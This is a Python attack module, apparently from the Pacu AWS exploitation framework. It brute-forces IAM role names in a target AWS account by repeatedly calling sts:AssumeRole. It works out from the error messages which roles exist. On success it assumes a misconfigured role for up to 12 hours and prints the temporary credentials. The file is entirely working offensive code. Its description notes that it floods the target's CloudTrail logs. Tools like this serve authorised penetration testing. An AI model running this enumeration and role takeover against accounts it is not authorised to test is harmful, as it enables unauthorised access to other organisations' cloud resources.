#!/usr/bin/env python3
import argparse
import botocore
import random
import string


module_info = {
    'name': 'bruteforce_assume_role',

    'author': 'Spencer Gietzen of Rhino Security Labs',

    'category': 'recon_enum_no_keys',

    'one_liner': 'Bruteforces existing roles in other AWS accounts to try and gain access via misconfigurations.',

    'description': 'This module takes in an AWS account ID and tries to bruteforce role names within that account. If one is discovered and it is misconfigured to allow role-assumption from a wide group, it is possible to assume that role and gain access to that AWS account through this method. NOTE: This module is listed under the recon_enum_no_keys category because it is not recommended to use compromised keys to run this module. This module DOES require a set of AWS keys, but it will spam CloudTrail logs with "AssumeRole" logs, so it is suggested to use a personal account to run this. The keys used must have the sts:AssumeRole permission on any resource.',

    'services': ['STS'],

    'prerequisite_modules': [],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--account-id', '--word-list'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--account-id', required=True, help='The AWS account ID of the target account (12 numeric characters).')
parser.add_argument('--word-list', required=False, default=None, help='File path to a different word list to use. There is a default word list and it is stored in this modules module folder. This word list should contain words, one on each line, of words to try when guessing IAM role names. Role names ARE case-sensitive.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input

    data = {
        'attempts': 0,
        'enumerated': [],
        'success': False
    }

    print('Targeting account ID: {}\n'.format(args.account_id))

    if args.word_list is None:
        word_list_path = './modules/{}/default-word-list.txt'.format(module_info['name'])
    else:
        word_list_path = args.word_list.strip()

    with open(word_list_path, 'r') as f:
        word_list = f.read().splitlines()

    client = pacu_main.get_boto3_client('sts')
    for word in word_list:
        role_arn = 'arn:aws:iam::{}:role/{}'.format(args.account_id, word)

        data['attempts'] += 1

        try:
            response = client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                DurationSeconds=43200
            )

            print('Successfully assumed role for 12 hours: {}\n'.format(role_arn))

            data['success'] = True
            data['role_arn'] = role_arn
            response.pop('ResponseMetadata', None)
            print(response)

            break
        except botocore.exceptions.ClientError as error:
            if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
                print('Vulnerable role found: {}!'.format(role_arn))
                print('  Hit max session time limit, reverting to minimum of 1 hour...\n')

                response = client.assume_role(
                    RoleArn=role_arn,
                    RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                    DurationSeconds=3600
                )

                print('Successfully assumed role: {}\n'.format(role_arn))

                data['success'] = True
                data['role_arn'] = role_arn
                response.pop('ResponseMetadata', None)
                print(response)

                break
            elif 'Not authorized to perform sts:AssumeRole' in str(error):
                # Role not found
                pass
            elif 'is not authorized to perform: sts:AssumeRole on resource' in str(error):
                # Role found, but not allowed to assume
                print('Found role: {}'.format(role_arn))
                data['enumerated'].append(role_arn)
                print('  Not allowed to assume it.\n')

    print('{} completed.\n'.format(module_info['name']))
    return data


def summary(data, pacu_main):
    if 'success' in data.keys() and data['success'] is True:
        return 'Successfully found a role we can assume after {} attempts: {}\nEnumerated {} restricted role(s): {}'.format(data['attempts'], data['role_arn'], len(data['enumerated']), data['enumerated'])
    else:
        return 'Did not find a role to assume after {} attempts.\nEnumerated {} restricted role(s): {}'.format(data['attempts'], len(data['enumerated']), data['enumerated'])
